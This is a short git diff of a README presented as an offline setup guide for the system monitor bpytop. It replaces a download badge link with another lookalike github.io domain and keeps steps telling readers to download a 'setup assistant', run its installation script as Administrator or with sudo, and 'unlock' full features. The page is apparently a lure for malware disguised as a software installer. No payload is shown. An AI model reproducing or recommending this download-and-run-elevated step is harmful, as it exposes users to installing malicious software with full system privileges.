@@ -1,6 +1,6 @@
 # bpytop — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://bpytop-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://bpytop-freedownload-info.github.io/.github/)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
@@ -8,6 +8,9 @@
 3. Run the included installation script as Administrator or with sudo  
 4. Follow the on-screen instructions to configure bpytop offline  
 5. Launch bpytop — full monitoring features enabled without internet
+
+---
+
 
 🎯 What You Unlock
 
